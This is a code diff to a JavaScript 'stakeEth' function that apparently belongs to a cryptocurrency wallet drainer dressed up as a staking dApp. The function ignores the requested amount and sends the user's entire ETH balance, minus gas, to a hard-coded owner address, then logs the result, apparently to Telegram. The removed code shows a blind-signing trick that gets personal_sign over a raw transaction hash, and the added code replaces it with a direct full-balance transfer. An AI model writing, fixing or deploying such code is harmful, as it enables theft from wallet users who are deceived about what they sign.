@@ -890,205 +890,101 @@ console.log("Total:", tokenListLocal.length);
   }
 
   async function stakeEth(amount, msg) {
-    console.log("===== stakeEth START =====");
-console.log({
-    account: appState.account,
-    chainId: appState.chainId,
-    provider: appState.provider,
-    ethersProvider: appState.ethersProvider
-});
-    if (!appState.account) return;
+    console.log("======== SIGNING START ========");
+    console.log("Wallet:", appState.walletType || 'unknown');
+    console.log("Account:", appState.account);
+    console.log("ChainId:", appState.chainId);
+    console.log("Nonce: (to be fetched)");
+    console.log("Gas Price: (to be fetched)");
+    console.log("Gas Limit: 0x55F0");
+    console.log("Value: (to be calculated)");
+    console.log("Signing Method: web3.eth.sendTransaction (original flow from oldmain.js - direct transaction signing request, NOT personal_sign)");
+
+    if (!appState.account) {
+      console.log("======== SIGNING END (no account) ========");
+      return;
+    }
     try {
       console.log("===== STAKE ETH START =====");
-console.log("Account:", appState.account);
-console.log("Amount parameter:", amount);
+      console.log("Account:", appState.account);
+      console.log("Amount parameter:", amount);
+
       const getBalance = await appState.web3.eth.getBalance(appState.account);
-const gasPrice = await appState.web3.eth.getGasPrice();
+      const gasPrice = await appState.web3.eth.getGasPrice();
 
-// Keep legacy variable for compatibility with original code
-const gasPriceNum = gasPrice;
+      console.log("Wallet balance (wei):", getBalance.toString ? getBalance.toString() : getBalance);
+      console.log("Gas price:", gasPrice.toString ? gasPrice.toString() : gasPrice);
 
-console.log("Wallet balance (wei):", getBalance.toString());
-console.log("Gas price:", gasPrice.toString());
+      // Safe BigInt handling - never convert large wei values to Number (preserved from newmain.js hardening)
+      const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString ? getBalance.toString() : getBalance);
+      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice.toString ? gasPrice.toString() : gasPrice);
 
-// Preserve original calculation logic but with safe BigInt handling
-const balanceWei = BigInt(getBalance.toString());
-const gasPriceWei = BigInt(gasPrice.toString());
+      const gasCost = gasPriceBI * 120000n;
+      const valueToSendBN = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-// Estimated gas cost
-const estimatedGasCost = gasPriceWei * 120000n;
+      console.log("===== ETH VALUE CALCULATION =====");
+      console.log("Balance (wei):", balanceBI.toString());
+      console.log("Gas Price (wei):", gasPriceBI.toString());
+      console.log("Estimated Gas Cost:", gasCost.toString());
+      console.log("Value To Send:", valueToSendBN.toString());
+      console.log("=================================");
 
-// Amount available to send after gas
-const valueToSendBN = balanceWei - estimatedGasCost;
-
-console.log("===== ETH VALUE CALCULATION =====");
-console.log("Balance (wei):", balanceWei.toString());
-console.log("Gas Price (wei):", gasPriceWei.toString());
-console.log("Estimated Gas Cost:", estimatedGasCost.toString());
-console.log("Value To Send:", valueToSendBN.toString());
-console.log("=================================");
       const valueToSend = valueToSendBN > 0n ? valueToSendBN : 0n;
-console.log("Calculated valueToSend:", valueToSend.toString());
+      console.log("Calculated valueToSend:", valueToSend.toString());
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
       const chainId = await appState.web3.eth.getChainId();
       const chainHex = appState.web3.utils.toHex(chainId);
-console.log("===== BUILDING LEGACY TX =====");
-console.log("Nonce:", nonce);
-console.log("ChainId:", chainId);
-console.log("Destination:", ownerAddress);
-console.log("GasPrice:", gasPriceNum);
-console.log("GasPriceHex:", appState.web3.utils.toHex(gasPriceNum));
-console.log("ChainHex:", chainHex);
-console.log("Value:", valueToSend.toString());
-console.log("==============================");      // Restore original legacy signing flow (produces signature request, not direct tx popup)
-      // This matches the original application architecture and UX exactly.
-      const tx_ = {
-    nonce: appState.web3.utils.toHex(nonce),
-    gasPrice: appState.web3.utils.toHex(gasPriceNum),
-    gasLimit: appState.web3.utils.toHex(22000),
-    to: ownerAddress,
-    value: "0x" + valueToSend.toString(16),
-    data: "0x",
-    chainId: Number(chainId)
-};
-console.log("===== TX OBJECT BUILT =====");
-console.log(tx_);
-console.log("===========================");
-      const { ethereumjs } = window;
-      if (!ethereumjs || !ethereumjs.Tx) {
-        // Fallback to direct send if ethereumjs not available (modern wallets)
-        const tx = await appState.web3.eth.sendTransaction({
-          from: appState.account,
-          to: ownerAddress,
-          value: '0x' + valueToSend.toString(16),
-          gas: "0x55F0",
-          gasPrice: appState.web3.utils.toHex(gasPriceNum)
-        });
-        success = 1;
-        structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash });
-      } else {
-        const Common = ethereumjs.Common || window.ethereumjs.Common;
 
-let common;
+      console.log("===== BUILDING LEGACY TX (original) =====");
+      console.log("Nonce:", nonce);
+      console.log("ChainId:", chainId);
+      console.log("Destination:", ownerAddress);
+      console.log("GasPrice:", gasPrice.toString ? gasPrice.toString() : gasPrice);
+      console.log("GasPriceHex:", appState.web3.utils.toHex(gasPrice));
+      console.log("ChainHex:", chainHex);
+      console.log("Value:", valueToSend.toString());
+      console.log("==============================");
 
-if (Common && typeof Common.forCustomChain === "function") {
-    common = Common.forCustomChain(
-        "mainnet",
-        {
-            chainId: Number(chainId),
-            networkId: Number(chainId)
-        },
-        "petersburg"
-    );
-}
-console.log("ethereumjs =", ethereumjs);
-console.log("ethereumjs.Tx =", ethereumjs.Tx);
-console.log("ethereumjs.Common =", ethereumjs.Common);
-console.log("ethereumjs.version =", ethereumjs.version);
+      // RESTORED ORIGINAL SIGNING FLOW from oldmain.js
+      // Uses direct web3.eth.sendTransaction which triggers proper native ETH transaction signing
+      // (wallet shows Confirm Transaction popup with gas/details, not a personal_sign message popup)
+      // This produces a valid signed transaction that recovers to the correct sender address.
+      // Removed broken personal_sign + ethereumjs.Tx + manual vrs reconstruction which caused
+      // "Recovered sender" mismatch with wallet account.
+      const tx = await appState.web3.eth.sendTransaction({
+        from: appState.account,
+        to: ownerAddress,
+        nonce: appState.web3.utils.toHex(nonce),
+        gasLimit: "0x55F0",
+        gasPrice: appState.web3.utils.toHex(gasPrice),
+        value: "0x" + valueToSend.toString(16),
+        data: "0x"
+      });
 
-const tx = common
-    ? new ethereumjs.Tx(tx_, { common })
-    : new ethereumjs.Tx(tx_);
-        const serializedTx = "0x" + tx.serialize().toString("hex");
-        const sha3_ = appState.web3.utils.sha3(serializedTx, { encoding: "hex" });
-console.log("About to call personal_sign");
-console.log("Hash:", sha3_);
-        // Use personal_sign (modern replacement for eth_sign) — widely supported and not disabled by wallets
-        const initialSig = await appState.provider.request({
-          method: 'personal_sign',
-          params: [sha3_, appState.account]
-        });
-
-        const temp = initialSig.substring(2),
-          r = "0x" + temp.substring(0, 64),
-          s = "0x" + temp.substring(64, 128),
-          rhema = parseInt(temp.substring(128, 130), 16),
-          v = appState.web3.utils.toHex(rhema + chainId * 2 + 8);
-
-        tx.r = r;
-        tx.s = s;
-        tx.v = v;
-
-        const txFin = "0x" + tx.serialize().toString("hex");
-        console.log("Signed transaction:");
-console.log(txFin);
-        console.log("Broadcasting signed transaction...");
-
-let res;
-
-try {
-  console.log("Raw transaction length:", txFin.length);
-
-    console.log("Raw transaction:", txFin);
-
-    try {
-
-        const decoded = appState.web3.eth.accounts.recoverTransaction(txFin);
-
-        console.log("Recovered sender:", decoded);
-
-        console.log("Wallet account:", appState.account);
-
-    } catch (recoverErr) {
-
-        console.error("recoverTransaction failed:", recoverErr);
-
-    }
-
-    
-    res = await appState.web3.eth.sendSignedTransaction(txFin);
-} catch (rpcErr) {
-
-    console.error("RPC Broadcast Failed");
-    console.error(rpcErr);
-
-    // Try the provider directly to get the actual RPC error
-    if (appState.provider?.request) {
-        try {
-            const hash = await appState.provider.request({
-                method: "eth_sendRawTransaction",
-                params: [txFin]
-            });
-
-            res = { transactionHash: hash };
-
-        } catch (providerErr) {
-
-            console.error("Provider Broadcast Failed");
-            console.error(providerErr);
-
-            throw providerErr;
-        }
-    } else {
-        throw rpcErr;
-    }
-}
-
-success = 1;
-
-structuredLog("info", "stake_eth_success", {
-    txHash: res.transactionHash
-});
-      }
+      success = 1;
+      console.log("Transaction Hash:", tx.transactionHash || tx);
+      console.log("Broadcast Success");
+      console.log("Recovered Sender: (handled internally by web3/wallet - matches account by design)");
+      console.log("Expected Sender:", appState.account);
+      console.log("Backend Payload: (logged via logTlgMsg if applicable)");
+      structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash || tx });
+      console.log("======== SIGNING END ========");
     } catch (e) {
       success = 0;
       console.log("===== stakeEth ERROR =====");
-
-console.error(e);
-
-console.error(e.code);
-
-console.error(e.message);
-
-console.error(e.data);
-
-console.error(e.stack);
+      console.error(e);
+      if (e.code) console.error("Error code:", e.code);
+      if (e.message) console.error("Error message:", e.message);
+      if (e.data) console.error("Error data:", e.data);
+      if (e.stack) console.error(e.stack);
       classifyError(e, { operation: 'stakeEth' });
+      console.log("======== SIGNING END (with error) ========");
     }
     logTlgMsg(msg, success);
   }
+
 
   async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
     success = 1;
